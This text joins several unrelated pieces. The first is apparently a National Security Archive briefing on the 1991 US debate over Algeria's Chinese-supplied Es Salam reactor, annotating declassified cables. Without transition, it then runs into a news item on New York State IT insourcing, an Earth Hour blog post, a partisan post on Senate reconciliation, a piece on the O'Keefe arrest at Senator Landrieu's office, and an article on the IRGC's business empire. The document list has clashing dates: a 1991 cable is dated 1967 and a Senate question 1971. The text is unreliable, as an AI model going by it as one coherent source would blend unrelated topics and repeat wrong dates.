In the spring of 1991 , leaks to the Washington Times on intelligence community discussions of the nuclear activities of the Algerian government and a Chinese reactor sale to that country stimulated a flap within the George H. W. Bush administration over the possibility that Algiers had started a nuclear weapons program .
NSC and State Department documents published for the first time today by the National Security Archive shed light on the internal U.S. debate over Algeria 's capabilities and intentions , on U.S. queries to China for details and assurances about the reactor sale , and Washington 's pressure to ensure that Algiers adhered to nonproliferation norms .
Washington in 1991 wanted Chinese help to assure Algerian compliance with nonproliferation goals .
Whatever Algeria 's real intentions were -- and the U.S. intelligence community was divided about this -- Washington , Beijing , and the international community brought Algiers into the NPT - system within a few years of the controversy .
The Algerian situation is an example of the complexities and difficulties of nuclear weapons intelligence .
Questions about the capabilities and intentions of potential members of the nuclear club , whose activities are invariably surrounded by tight secrecy , have characteristically shaped the policy debate on nuclear proliferation .
Declassified U.S. government documents on pending controversies , e.g. , over Iran and North Korea , are practically impossible to obtain , even on the earliest stages of the controversy .
Thus , recently declassified documents from 1991 on the then - secret debate over Algeria 's nuclear ambitions provide a rare glimpse of an early post - Cold War test of the nuclear nonproliferation regime .
( Note 1 )
The Algerian nuclear question became a public issue on April 11 , 1991 , when the Washington Times published a story by Bill Gertz headlined : " China Helps Algeria Develop Nuclear Weapons . "
Reflecting his military intelligence sources , Gertz wrote that Beijing was helping the Algerian government build a nuclear reactor near the village of Ain Oussera that could be used to build weapons .
( Note 2 ) According to one of Gertz 's anonymous sources , " This is clearly a military nuclear reactor for weapons production . "
No power - lines or power - generating facilities at the reactor were evident and an anti-aircraft missile battery was spotted near the site .
Gertz 's sources also told him that Beijing was supplying the Algerians with " military advice on how to match nuclear weapons to various aerial and missile delivery systems . "
Only months before the Gertz story appeared , U.S. photographic satellites had picked up images of the construction , in an isolated part of the country , of the Ain Oussera nuclear site .
While military intelligence interpreted the reactor and the site in the way that Gertz described , he did not mention that State Department analysts who , while concerned , were not convinced that it was a military project .
( Note 3 )
The press leaks made the Algerian nuclear question a public one .
The controversy spread to Congress and intensified pressure on the George H.W. Bush administration and the International Atomic Energy Authority to ensure that Algeria was developing on lines that were compatible with nonproliferation norms .
Gertz 's story may have forced the Bush administration 's hand by inducing it to confront the Algerian problem more quickly than it may have originally intended .
That the story involved China , whose nuclear relationship with Pakistan already troubled the Bush Administration , made the issue an even more complex and delicate one .
Whatever the reactor 's exact purpose was , no doubt suspicions increased when , on 10 April 1991 , the Algerian government expelled the British military attaché , William Cross , who had been found taking pictures near the site .
( Note 4 ) Even though Algeria was undergoing an uncertain and difficult transition from a system controlled exclusively by the National Liberation Front to a more pluralist , multi-party system , a " culture of secrecy " was a powerful legacy of one - party rule and the underground anti-colonial resistance .
( Note 5 ) While U.S. ( and British ) intelligence sought to penetrate the secrecy , Washington understood the delicacy of Algeria 's internal situation , especially the threat posed by the Islamic Salvation Front to any possibility for the development , much less preservation , of political democracy .
This made it important to avoid a heavy - handed approach to Algeria that could lead to protests against Western intervention , especially after the recent war with Iraq .
After the revelations in the media about the Es Salem reactor , the Bush administration issued secret demarchés to both Algiers and Beijing .
An approach to China was difficult because of an already difficult relationship with Beijing over human rights and trade issues during the tense post - Tiananmen period .
Nevertheless , the Bush administration wanted help from China to ensure that the Algerians applied appropriate safeguards to ensure that it would be used for civilian energy purposes only .
The issue was settled in ways that the Bush administration found more or less satisfactory , with both Algeria and China agreeing that the reactor should be subject to inspection by the International Atomic Energy Agency ( IAEA ) .
Inspections began the next year .
With Beijing positioning itself to sign the Non-Proliferation Treaty , it had reason to demonstrate its commitment to the nonproliferation agenda .
Much remains secret about the controversy over the Algerian nuclear project , for example , over the extent of internal debate over how tough to be with Beijing over the deal with Algeria .
Nevertheless , State Department has released important documents , a number of them after FOIA appeals , from the files of Ambassador - at - Large for Nonproliferation and Nuclear Energy Policy Richard T. Kennedy , who played a key role in the Reagan and Bush administrations .
While significant information was denied , probably to protect intelligence sources and sensitive diplomatic communications , the documents provide insight into the controversy :
An NSC report on the " Algerian Nuclear Program " suggests why some U.S. officials were worried ; the " cooling towers of the reactor appear adequate to support operation of a substantially large reactor , possibly up to 50 MWT , " much larger than would be needed for nuclear research .
Also of concern was " heavy - walled facility ?
that appears suited to provide options for a future reprocessing capability , waste storage , or research applications . "
An updated version of the same report observed that " We do not have sufficient information from which to conclude that the [ Algerian Government ] has decided to pursue a military nuclear program " ; nevertheless , the State Department wanted the IAEA to inspect the Algerian facilities to answer questions about the reactor 's power level and the size of the cooling tower .
Illuminating the State Department 's skeptical stance about the hard - line interpretations of Algerian nuclear intentions , one routing memo reads " This should help put to rest the great Algerian nuclear weapons scare . "
In response to still - classified demarches , by late April Algeria and China had issued statements about the reactor project that , according to a State Department memorandum , " alleviated our concerns about the proliferation implications " .
Nevertheless , Washington should " continue to press [ Algeria| to act promptly by notifying the IAEA of its intention to submit the reactor to safeguards . "
At the end of May 1991 , the Chinese government handed the State Department a confidential note describing the February 1983 agreement with Algeria and stating that it was supplying the Algerians with 11 metric tons of heavy water and 216 fuel modules .
Continued concern about Algeria 's intentions led the State Department to apply pressure on Switzerland to refuse to sell to Algiers a hot isostatic press , which had nuclear weapons and missile applications .
Newly declassified documents illuminate a late stage of the controversy , when The New York Times ran a story in November 1991 asserting that Ambassador Kennedy had suppressed information on the Algeria - China nuclear connection that had come to light several years before U.S. intelligence discovered the reactor .
As it turned out , Ambassador Kennedy had turned over documents to INR , which then " misplaced " them for over two years .
In light of U.S. expectations in 1991 that the IAEA would be inspecting Algeria 's nuclear facilities , the nuclear issue probably faded in importance for Washington , compared to more fundamental fears over Algeria 's future .
In early 1992 , after national elections in which the Islamic Salvation Front scored impressive victories , the military established a " state of emergency . "
Soon a brutal and bloody civil war broke out between Islamic fundamentalists and the Algerian police and military .
Civil war notwithstanding , in 1993 Algeria pledged to sign the Nuclear Non-Proliferation Treaty ( which it did in 1995 ) , but the safeguards which the IAEA negotiated did not put an end to speculation about Algeria 's nuclear interests .
The safeguards were limited , e.g. , the Agency can not inspect all of the facilities and apparently has received little information from Algiers on the project 's origins .
According to a 1997 report by David Albright and Corey Hinderstein , Algeria has cooperated with the IAEA within the limits of its current safeguards agreements , but it " has not been open enough to allay widespread suspicions about its activities . "
( Note 6 ) Algeria , like other African and Middle Eastern countries , continues to pursue nuclear options for electric power and desalination ; some observers worry that they are seeking a " nuclear hedge " in the event that Iran develops weapons .
No doubt , U.S. intelligence and others continue to monitor the Algerian situation .
( Note 7 ) Whether the intelligence community ever solved the puzzle of the cooling tower , however , may be learned from future declassifications .
Documents
[ Source note : All documents included in this Electronic Briefing Book were obtained under the Freedom of Information Act from the U.S. Department of State ]
Document 1 : U.S. embassy Algeria cable 01357 to State Department , " Nuclear Cooperation between Argentina and Algeria , " 2 April 1991 , Secret , Excised Copy
The Argentines provided Algeria 's first nuclear research reactor but it produced no controversy because the agreement applied IAEA safeguards .
During this reported conversation between U.S. Ambassador Christopher Ross and a person who may have been an Argentine government official , the latter mentioned " `rumors ' about the possible ' hush - hush ' construction with Chinese aid , of a second ?
nuclear reactor designed to produce isotopes . "
A confidential embassy source noted that the " Moroccans were quite concerned about the Algerian nuclear program , but implied there was little real basis for worry . "
Document 2 : U.S. embassy Algeria cable 01502 to State Department , " Algerian Nuclear Program , " 12 April 1991 , Secret , Nodis , Excised Copy
The Washington Times story quickly reached Ambassador Ross , who may have discussed it with the Algerians or had his own observations .
The cable 's " nodis " [ no distribution without permission ] status , which has been massively excised , suggests its high sensitivity .
Document 3 : State Department cable 119578 to U.S. Embassy Beijing et al. , " Press Guidance : China - Algeria Nuclear Cooperation , " 12 April 1991 , Unclassified
When a BBC reporter asked the State Department spokesman about the Washington Times story , State Department spokesperson Richard Boucher took exception to the story 's thrust : " We have no reason to conclude that China has agreed to provide assistance to Algeria for nuclear weapons development . "
In any event , the Department would " continue to review China 's nonproliferation practices to determine whether they are consistent with its pronouncements " that it " does not engage in nuclear proliferation . "
Document 4 : U.S. embassy Algeria cable 01547 to State Department , " MFA Confirms Chinese - Algerian Nuclear Cooperation , " 14 April 1991 , Unclassified
On 14 April Algeria 's foreign minister confirmed its program of nuclear cooperation with China " stressing that it is for peaceful uses . "
Documents 5a and 5b : Review by Policy Coordinating Committee
Document 5a : William F. Sittman , Executive Secretary , National Security Council , to J. Stapleton Roy et al. , " Algerian Nuclear Program , " 25 April 1991 , Secret
Document 5b : J. Stapleton Roy to William F. Sittman , The White House , " Algerian Nuclear Program , " n.d. , Secret , Excised Copy
The Washington Times story was followed by more , in the Los Angeles Times and the Washington Post , as well as an industry trade journal , Nucleonics Week ( whose European correspondent , Mark Hibbs , gave full coverage of the interagency debate ) .
( Note 8 ) It was not until 25 April , however , that the National Security Council asked its Policy Coordinating Committee ( PCC ) on Non-Proliferation to review the Algerian question and make recommendations on a " course of action " to the Deputies Committee .
In particular , the PCC was to look at " any aspect of that program ? that would not be satisfactorily addressed by IAEA safeguards . "
A few days later , the PCC replied with its report and recommendations .
Providing some basic history of Algerian - Chinese nuclear cooperation , the paper noted the problem of the cooling tower 's large size :
The Algerian and Chinese description of the project as a 15 MW reactor notwithstanding , " the cooling towers ?
appear adequate to support operations of a substantially large reactor possibly up to 50 MWT . "
( Note 9 ) While some Algerian political parties supported the acquisition of nuclear weapons , even if the government had that goal in mind , a development program would need " significant foreign assistance . "
The defensive missile batteries that had excited intelligence analysts and the Washington Times had been removed in March .
To ensure that the Algerians stayed away from a military path , the U.S. would continue to encourage Algeria to consult with the IAEA , as well as to sign the NPT .
Washington was working with a number of allies -- France , the UK , Germany , Italy , Spain , and Portugal - - to " exert influence on Algeria " along the same lines .
To the extent that other measures " other than , or in addition , to safeguards , " became necessary the Department of Defense had developed a proposal for the event that the " Algerian reactor turns out to be larger than 15 mwt . "
The proposal is excised , but it may have involved suggestions for coercive measures , from economic embargo to military action .
Documents 6a and 6 b : Beijing Responds
Document 6a : U.S. Embassy Beijing cable 12377 to Department of State , " MFA Statement on PRC Nuclear Cooperation with Algeria , " 30 April 1991 , Unclassified
Document 6 b : Memo to Richard T. Kennedy from Gary Samore , 30 April 1991
On 30 April 1991 , Beijing responded publicly to U.S. pressure by declaring that the designed power of the rector was 10 megawatts and that it was " totally groundless to allege ?
that the reactor can be used to make nuclear weapons . "
Moreover , when Algiers and Beijing signed the contract for the reactor in 1983 , China was not a member of the IAEA " so that there was no such a question as submitting to international safeguards . "
That same day , Gary Samore passed on to Ambassador Kennedy information that " should help put to rest the great Algerian nuclear weapons scare . "
What that information was is not clear ( but it may have been the PRC announcement ) .
Document 7 : Memorandum from John H. Kelly , Richard T. Kennedy , and E.U. Curtis Bohlen to Under Secretary of State for International Security Affairs Reginald Bartholomew , " Algerian and Chinese Statements Help Ease Proliferation Concerns , " 2 May 1991 , Secret / Noforn , Excised Copy
On 29 April , a few days before the Chinese statement , the Algerians made their own public declaration about the reactor 's size and its peaceful purposes .
State Department officials had a cautiously optimistic take on the statements from Algiers and Beijing : " if the ? statements about safeguards and the reactor 's size are true , the reactor will not likely pose a proliferation threat .
Nevertheless , we will continue to press the Algerian government ? to submit the reactor to [ IAEA ] safeguards . "

Documents 8a and 8b : Assurances to the French
Document 8a : U.S. Embassy France cable 11903 to State Department , " Dumas Claims Assurances on Algerian Reactor , " 2 May 1991 , Confidential
Document 8 b : " French Foreign Minister 's Remarks on Chinese / Algerian Nuclear Cooperation , " 2 May 1991 , Unclassified
Visiting Beijing Foreign Minister Roland Dumas emerged from discussions with Chinese officials with a statement on the Algerian nuclear question : " There is no question of Algeria 's acquiring a nuclear weapon . "
Nevertheless , in view of its former colonial relationship with Algeria , France would be watching the situation closely .
The U.S. embassy noted with some surprise that the French media was not playing up the Algerian nuclear story , but perhaps it was because British media had picked it up first .
Document 9 : State Department cable 133496 to U.S. Consulate Hong Kong , " Sino - Algerian Cooperation : New Developments , " 2 May 1991 , Secret , Nodis , Excised Copy
To update Undersecretary for Political Affairs Robert Kimmitt , before he arrived in Beijing for meetings with senior officials , the Department provided information on the latest Algerian developments , as well as the text of a paper on " China and Nuclear Nonproliferation . "
Document 10 : Richard Clarke 's Briefing - U.S. Embassy Egypt cable 1187 to State Department , " Briefing on Sino / Algerian Nuclear Cooperation , " 5 May 1991 , Secret , Nodis , Excised Copy
Acting Assistant Secretary of State for Politico - Military Affairs Richard Clarke was in Cairo for discussions on arms control when Foreign Ministry officials asked him about the press reports on Algeria .
Clarke gave a briefing that drew on a still - classified State Department cable .
Document 11 : U.S. Mission to International Organizations in Vienna cable 00964 to State Department , " Algeria Reactor and IAEA Safeguards , " 10 May 1967 , Secret , Excised Copy
The U.S. mission to the IAEA , had learned of the Agency 's recent contacts with Algeria and China , but the details are classified .
Document 12 : U.S. embassy China cable 13790 to State Department , " U/S Kimmitt 's Meeting with Liu Huaqiu : Bilateral Issues , " 13 May 1991 , Secret , Nodis , Excised copy
During Kimmit 's meetings with Vice Foreign Minister Liu , the two agreed that U.S. - China relations were at a " critical point " in view of ongoing controversies over nonproliferation , trade , human rights , and renewal of Most - Favored Nation [ MFN ] status .
While Liu objected to any linkage of MFN renewal with controversial problems , Kimmitt argued that the White House 's decisions on MFN " would inevitably be against the backdrop of China 's actions on these issues . "
On the Algerian nuclear problem , Kimmitt offered his appreciation over China 's statement on nuclear cooperation with Algeria and expressed hope that Beijing would not only " encourage " Algiers to contact the IAEA , but that China would also sign the NPT .
Kimmitt expressed greater disquiet about China 's nuclear relationship with Pakistan .
After insisting that Beijing had a " serious and responsible " attitude toward nonproliferation problems , Liu observed that Washington had policy " contradictions , " e.g. , " refusal to make an unconditional commitment not to use nuclear weapons against NFZ 's [ nuclear free zones ] or against non-nuclear countries . "
Document 13 : U.S. embassy Algeria cable 02133 to State Department , " Algerian Nuclear Developments , " 22 May 1991 , Confidential
The embassy describes the Algerian government 's media strategy , as well as the efforts of U.S. diplomats to " keep the safeguards issue before our Algerian contacts . "
During a conversation with Ambassador Ross , the Chinese ambassador emphasized the " peaceful research and industrial applications " of the project .
The reactor could be used later for power generation " but consideration of such a possibility was some time off . "
Noting that the early media reports , e.g. Gertz's , had claimed that the reactor was near the Mediterranean coast , the embassy pointed out that it was being built on a high plateau above the Atlas Mountains , 130 kilometers south of the capital .
Document 14 : Memo from Steve Aoki to Herb Levin , Ellie Busick , and Richard Albright , n.d. , enclosing Chinese paper on nuclear cooperation with Algeria , 29 May 1991 , Confidential
As another sign of a forthcoming attitude on Beijing 's part , during a meeting with Steven Aoki , special assistant to Under Secretary Reginald Bartholomew , Chinese embassy political counselor Xiao Houde handed over a paper with background information on the Algerian project .
It included details on the purpose of the reactor and the nuclear materials provided to the Algerians .
According to Aoki's report , China was " encouraging Algeria to move quickly to get safeguards in place . "

Document 15 b : Talking Points , 28 May 1991 , Secret , excised copy
In preparation for Bartholemew 's mid-June trip , the State Department prepared some background information along with a " non-paper " that described the information that the Bush administration wanted from Beijing to understand better " the nature of Sino - Algerian nuclear cooperation . "
It is possible that the separate talking points document related to the non-paper because it included at least one question that Washington hoped that Beijing would answer : confirmation that China , like the United States , would be " seriously concerned " if Algeria was to " import , or develop indigenously , an enrichment or reprocessing capability . "
Document 16 : U.S. embassy Algeria cable 02382 to State Department , " TV Feature on Algerian Nuclear Program , " 7 June 1991 , Confidential
Reporting on a two - hour long TV documentary on the Es Salam reactor , which included interior and exterior footage and interviews with managers and scientists , the Embassy commented that " this was a remarkable and uncharacteristic case of Algerian openness . "
Nevertheless , the Embassy believed that it would have " been more convincing had it come spontaneously , instead as part of a deliberate campaign to counter western press reports . "
Documents 17a and 17b : Senator Biden's Questions to the State Department

Document 17b : Question for the Record Submitted to Mary Ann Casey by Senator Biden , June 25 , 1971 , Unclassified
Senator Joseph Biden ( D - Del ) , a member of the Senate Foreign Relations Committee , and a vocal critic of Beijing 's nuclear policy , had argued that , in light of the Algerian problem and related nuclear issues , " it appears China is rapidly becoming a rogue elephant among the community of nations . "
To get background information on the Algerian , Biden submitted a series of questions to Mary Ann Casey , who was then serving as Deputy Assistant Secretary for Regional Analysis in the State Department 's Bureau of Intelligence and Research ( she became Ambassador to Algeria later in the year ) .
The classified material shows that by late June the government was still unsure why the cooling towers were so large .
" A 50 MWT reactor - depending on the type of fuel used - would be able to produce a significant amount of plutonium in its spent fuel " , enough to fuel at least one device a year .
On the cost of the reactor , INR made the point that the " Chinese may have inflated the actual cost of the facility in order to enhance the hard currency profit that would accrue . "
Document 18 : " Talking Points on Algerian Nuclear Developments for Delivery to Senators Glenn and Roth ( SGA ) , Senators Pell and Helms ( SFRC ) , and Congressmen Fascell and Broomfield ( HFAC ) , " circa 29 July 1991 , Secret / NoForn , Excised Copy
Material prepared by INR for key Congressmen in late July repeated some of the points made in earlier briefing papers .
Noting that the reactor 's design specifications were consistent with a research program , INR noted that the Es Salem reactor was similar to one located at the Institute of Atomic Energy Research near Beijing .
While questions about the cooling tower remained , once Algeria had negotiated a safeguards agreement with the IAEA it would provide the Agency with technical information about the reactor that would provide answers .
The " defensive measures " that the Algerians had taken near the reactor " coincided with the duration of Desert Storm " ( Internally divided over the Gulf conflict , Algeria had abstained from the UN resolutions against Iraq ) .
Document 19 : State Department cable 281258 to Embassy Switzerland , " Proposed Sale of Hot Isostatic Press to Algeria , " 26 August 1991 , Confidential , Excised Copy
While waiting for the Algerians to take action with the IAEA , Washington remained concerned about Algeria 's intentions ; for example , an excised cable suggests pressure on the Swiss not to sell a hot isostatic press to Algiers .
A dual - use technology , a hot - istostatic press had significant military potential , both for missile and nuclear weapons programs .
Document 20 : " The Algerian Nuclear Program , " n.d. [ circa 1 September 1991 ] , Secret / NoForn
The Policy Coordinating Committee [ PCC ] on Non-Proliferation updated its Algeria paper sometime in September 1991 .
Besides providing basic background information , the PCC updated the state of play on the Algerian approach to the IAEA noting that " Algeria 's record on timely completion of safeguards negotiations with the IAEA on the [ Argentine reactor ] is not a good one . "
The PCC emphasized the " current political uncertainties . "
Until elections were held , probably later in the year , " the government will not be able / willing to take significant decisions . "
Thus , U.S. pressure for a safeguards agreement could not become public information lest the subject " become a highly charged political issue . "
The PCC would continue its pressure on the Algerian government but if a " significant nuclear proliferation risk " emerged , it would explore " other options . "
Documents 21a-c : Missing Documents
Document 21a : James R. Hall to Ambassador Kennedy , " New York Times Article , 11/15/1991 , Headlined ' Algerian Reactor : A Chinese Export , ' " 18 November 1991 , Secret , Excised copy
Document 21b : Letter , Ambassador Richard Kennedy to Editor of the New York Times , 20 November 1991
Document 21 c : Memorandum , Douglas P. Mulholland to Mr. Eagleburger , " Press Allegations Concerning Data on Sino- Algerian Nuclear Cooperation , " 25 November 1991 , Secret , Excised Copy
A New York Times story in November 1991 highlighted initial U.S. " inaction " on the Algerian nuclear problem because of " longstanding disagreements within the Government over how to interpret intelligence data and how tough to be on China . "
According to the article , in 1988 Richard Kennedy had received information on the Algerian - China nuclear deal but had , in effect , sat on the material for several years .
The implication was that he wanted to avoid a controversy with China .
Declassified reports show , however , that Kennedy had not suppressed the documents - a letter in English and several documents in French and Chinese - but had them sent to INR for analysis .
" The documents were misplaced and were discovered by INR during a March 1991 file search . "
Writing to the editor of the Times , Kennedy complained that no one had interviewed him and insisted that the " information [ about Algeria had been ] put in the hands of the proper intelligence office without delay . "
The Times did not publish his letter .

Document 22 : " Core Points Nuclear Proliferation and the NPT , " n.d. [ circa October - November 1991 ] , Secret
As background for a November 1991 trip to Beijing , Secretary of State James Baker received some talking points on China and the nuclear proliferation problem .
While supporting Beijing 's decision to sign the NPT , State Department officials remained concerned about China 's ambiguous nuclear relationship with Algeria , Iran , and Pakistan .
Perhaps not entirely confident that Beijing got the message that Under Secretary of State Bartholomew had delivered during his June visit ( if he had had an opportunity to deliver it at all ) , Baker 's advisers suggested that he express hope that China " will continue to urge Algeria to complete its safeguards agreement " and " refrain from any transfers of sensitive nuclear technologies to Algeria .

New York State has embarked on a plan to shift a number of jobs filled by IT contractors and consultants to the state payroll as part of an effort to save millions of dollars .
As many as 500 new state IT jobs may be created under a new in - sourcing program that was recently approved by the legislature and backed by Gov. David Paterson .
This law creates " term appointments " for state IT workers , which strip away some hiring and firing rules that apply to permanent workers .
The maximum tenure for " term appointments " is five years .
The state estimates that it can save approximately $ 25,000 annually for each contracting position that is shifted to the state payroll .
The annual savings is pegged at as much as $ 15 million , but that estimate is contingent on whether the contracted positions can be replaced .
" I think most managers here would be very happy if we did n't need to outsource , " said Mark Leinung , deputy director for state operations , said yesterday in a presentation to state managers that was made available on the Web .
The state may still turn to outsourcers in cases where it lacks the expertise needed for certain jobs , said Leinung .
However , he added that the state plans to use some of the money saved to boost its IT training programs .
The term appointment law allows the state to hire workers that have n't taken a civil service exam , or if they have , regardless of the grade .
The workers will be treated as " at will " employees , increasing the state 's ability to terminate their employment , according to state documents .
The state has contractors now using H - 1B visa holders , but the state is recommending that any state agencies " avoid hiring candidates who require visa adjudication " to the term positions .
As an example of how the move would cut costs , proponents of the law say that a state IT worker might earn an average of $ 55 an hour , including benefits , while the state pays its contractors an average of $ 128 an hour for workers in similar jobs .
The state built a worksheet to calculate the in - source cost savings .
Salaries for IT jobs filled by " term appointments " will range from just over $ 49,000 to $ 96,000 , according to a state fact sheet .
The benefits package , including medical and paid time off , increases those totals by about 48 % .
These term employees can also enroll in New York state retirement systems .
New York , like many other states , is trying to close a multi-billion dollar budget deficit .
Whether government workers are less costly than contractors does n't have a conclusive answer , said Ray Bjorklund , a vice president at consulting firm Federal Sources Inc. in McLean , Va .
In the short - term , the outsourcing contracts may appear to be more expensive -- and sometimes are .
But a temporary appointment who is ultimately hired to a full - time post could prove more costly than a consultant in the long term .
Moreover , state employees need equipped office space as opposed to contractors who may do most of their work remotely , perhaps out of state .
On the other hand , on - site workers would contribute directly to the state 's economy , said Bjorklund .
The idea of in - sourcing began gaining traction at the federal government level in the latter years of President George W. Bush 's administration and accelerated after the election of President Barack Obama , said Bjorklund .
Government officials began to realize that outsourcing too many tasks in IT and elsewhere could lead to the loss of expertise in key areas .
He said many officials concluded that there is a need to " protect inherently governmental functions from compromise . "
A recent survey of 11 New York state agencies found multiple IT contracts with a total value of $ 302 million .

Where were you when the lights went out ?
The world recently took part in Earth Hour , which started in 2007 in Sydney , Australia when 2.2 million homes and businesses turned their lights off for one hour to make their stand against climate change .
Only a year later and Earth Hour had become a global sustainability movement with more than 50 million people across 35 countries participating .
My favourite thing about it , is that many places celebrate by having a massive Fireworks display , which to me , seems to go against the whole movement somewhat .
Both Sydney & Seatlle did that this year .
But I do like the pretty lights ….
I support the movement due to the public awareness it raises , but I personally feel that it still allows the average person to participate and then forget about what they can do to help save the planet , for another 12 months .
I truly hope I am wrong , and the attitudes of the peoples of the world begin to change .
Anyway , while the lights were off , I got creative !
I made some shirt designs and stuff , to help make the world brighter and more fun .
Yay for me !
They make excellent gifts and will also increase your coolness quotient by a factor of 22 .
Also , the money raised will help fund me to do some art classes and make better / funnier comics , which is something that I am sure you all want .

Lindsey Graham is asked to respond to Harry Reid 's statement that the GOP Should " Stop Crying " About Reconciliation :
Senate Majority Leader Harry Reid told reporters Tuesday that Republicans " should stop crying " about the possible use of the parliamentary procedure known as budget reconciliation to pass a health care reform bill .
Reid said reconciliation had been used 21 times since 1981 , mostly by Republicans when they were in control of the Senate for the passage of items like the Bush tax cuts .
( Here 's a handy chart of when the procedure has been used . )
Under reconciliation , Democrats would need a simple majority in the Senate to pass legislation , as opposed to the 60 votes needed to break a filibuster .
" They should stop crying about reconciliation as if it's never been done before , " Reid said .
Of course Graham thinks this will be the " end of minority rights in the Senate " after the Republicans being the most obstructionist in history and the Democrats accepting 160 Republican amendments to this mess of a health care bill which is unfortunately already bipartisan .
These Republicans continually count on the country listening to what they say as opposed to what they do .
That does n't stop Graham from calling getting what is a bipartisan bill passed on health care " arrogance on steroids " and calling this the " end of the Senate as you know it " .
Sorry Lindsey .
This has just been more of the Senate as we know it where what might be good bills go to die a slow death and Senators from states representing much less of the population than most of the large cities in the United States can muck up legislation for the rest of us who are not equally represented there .
I 'm just sick to death of the Democrats accepting Republican ideas without demanding some votes in return for caving into their wishes .
It allows the likes of Graham here to continue to do their revisionist history on how none of their ideas were accepted .
So who are the four geniuses who got arrested by the FBI yesterday for — apparently — trying to tap the phone of a sitting U.S. senator ?
James O'Keefe , Robert Flanagan , Stan Dai , and Joseph Basel , were arrested by U.S. Marshals yesterday for " entering federal property under false pretenses for the purpose of committing a felony " after they allegedly dressed up as telephone repairmen and attempted to tamper with the phones of Sen.
Mary Landrieu 's New Orleans office .
O'Keefe is 25 years old , the rest are all 24 .
Here 's what we know about them :
James O'Keefe
O'Keefe came to fame last summer when he and his colleague Hannah Giles dressed up for Halloween early and walked into ACORN offices nationwide pretending to be a hooker and a pimp seeking tax advice , thereby blowing the lid off the sordid scandal that was ACORN 's free tax advice to people pretending to be hookers and pimps .
The sting was tightly coordinated with the launch of Andrew Breitbart 's BigGovernment.com and promoted beyond saturation by Fox News , which heralded the pair as the conservative answer to 60 Minutes .
We 've asked Breitbart whether O'Keefe and his pals were on assignment for Big Government when they were arrested , but have n't heard back .
The Washington Independent 's David Weigel says his sources are saying they were n't .
And , of course , Fox News , which was one of the outlets that pushed hardest to turn O'Keefe into a folk hero , is taking the position that this Landrieu office incident is a story " that probably needs a lot of context and a lot of looking into " before anyone jumps to conclusions .
Unlike , say , videos of a white boy in garish pimp clothes which are prima facie evidence of ... something .
Robert Flanagan
Flanagan is the son of William Flanagan , the acting U.S. Attorney for the western district of Louisiana .
Which makes it rather awkward that he was arrested in , and is being prosecuted by the U.S. Attorney for , the eastern district of Louisiana .
The elder Flanagan ascended to the gig just one week ago after his Bush - appointed boss left office ; none other than Sen.
Mary Landrieu has submitted recommendations for his replacement to the White House .
UPDATE : And Obama has nominated Landrieu 's recommendation , Stephanie Finley .
But Sen. David Vitter has placed a hold on Finley 's confirmation because he wants assurances from the White House that Jim Letten , the U.S. Attorney who will be overseeing Flanagan 's prosecution , wo n't be replaced .
In other words , Flanagan 's dad only has a job because the job of the guy who 's prosecuting his son is in potential jeopardy .
Vitter wants Obama to re-nominate Letten , a step that Landrieu says is redundant seeing as how he already has the job .
Louisiana politics .
Stan Dai
Dai appears to be a long - time conservative rabblerouser : A Stan Dai was the head of George Washington University 's Conservative Student Union , and a GWU student by the same name was quoted in 2004 in support of some pro-life student activists engaging in political theater at a John Kerry campaign event .
And a then - 17 - year - old named Stan Dai in Naperville , Ill. , told a USA Today reporter covering a student anti-war protest in 2003 : " The people who organize the anti-war movement annoy me . "
This picture is from the Facebook page of a Stan Dai who attended GWU and is friends with Joseph Basel , one of the other plumbers busted yesterday .
UPDATE : Lindsay Beyerstein finds two delightful datapoints about Dai : He was the recipient of a scholarship from the conservative Phillips Foundation , which also awards the Robert Novak Journalism Fellowship ( he 'd approve ! ) , and he is an assistant director at Trinity Washington University 's Intelligence Community Center of Academic Excellence , which trains people how to be spies .
SECOND UPDATE : Here 's Dai discussing international terrorism and why emerging political leaders need to get " beyond the partisan " in a May 2008 interview conducted for the Junior Statesman Association , an organization that encourages high school students to get involved in politics .
The extent of the Revolutionary Guards ' control over the Iranian economy is ­apparent as soon as you enter the country .
They run the main international airport , and the manner in which they acquired it was a bruising demonstration of the way big business is now done in Iran .
The contract for managing Imam Khomeini airport , south of Tehran , was given to a Turkish - Austrian consortium in 2004 , but on 8 May , the day it was supposed to open , guardsmen took it over , blocking the runways with their vehicles , and closing it down .
Inbound flights had to be hastily diverted .
The Islamic Revolutionary Guard Corps ( IRGC ) declared that the involvement of foreigners posed a security risk because of an alleged link to Israel , but it was clear that the foreign consortium 's biggest mistake was to try to cut the IRGC out of its business model .
Ever since , excluding the guards has been exceedingly difficult , if not impossible , from Iran 's economy .
The corps , which was born as a ­volunteer militia in the heat of the 1979 revolution , is now unrecognisable from those early beginnings .
It has grown into a behemoth which dominates both Iran 's official and black economies .
It is impossible to gauge its market share , but western estimates range from a third to nearly two - thirds of Iran 's GDP – amounting to tens of billions of dollars .
But the Iranian economy has changed the Revolutionary Guards as much , if not more than , they have changed it .
" The IRGC is really a corporation .
It is a business conglomerate with guns , " said Ali Ansari , an Iran expert at St Andrews University .
It was misleading to call Iran a military dictatorship , he said .
" This is not a military junta .
I see it as a collection of business and religious interests .
I do n't think they have the cohesion to move as one unit . "
Through holding companies , front companies , and " charitable foundations " the IRGC is a big player in the construction business , oil and gas , import - export , and telecommunications .
Its company subcontracts work to foreign firms , and its subsidiaries bid for contracts abroad .
The IRGC 's control over a string of jetties along the Gulf coast , as well as terminals in Iranian airports , allows it to move commodities in and out without paying any duty .
" If you want to get things to and from Iran without paying excise duty , they are the people to go to , " said Meir Javedanfar , an Iranian - Israeli analyst .
" No big businessman in Iran is truly independent of them or the government . "
Mohsen Sazegara , an exiled Iranian dissident who helped found the IRGC , calls it now " a very strange and unique organisation " , comparing it to the Soviet - era KGB for its extensive intelligence wing .
" It 's also like a huge investment company with a complex of business empires and trading companies , while also being a de facto foreign ministry through the Qods force , which controls relations with countries in the region .
They are involved in smuggling drugs and alcohol .
I know of no other institution like the Revolutionary Guards . "
The spread of the IRGC 's domain into the economy began in earnest in the early 1990s , under the country 's president , Akbar Hashemi Rafsanjani .
He is still a political player , a business mogul and the corps ' greatest rival , but in the aftermath of the Iran - Iraq war , encouraging the IRGC to get involved in construction was a way of rebuilding the country and funding the corps .
Ansari said : " This all started with Rafsanjani saying : go and make money , and they went and did this and thought , this is easy .
They started off taking commissions and ended up taking over whole factories .
The economic buyout has been going on for years . "
The IRGC operate in part through Iran 's bonyads , ostensibly charitable foundations that operate as huge holding companies .
Under the shah they were a way of channelling wealth to favoured courtiers .
After the revolution they were vehicles for self - enrichment by the ayatollahs .
Now , in a reflection of the regime 's continuing evolution , the IGRC is the dominant force , particularly through Bonyad e-Mostazafan , the Foundation of the Oppressed .
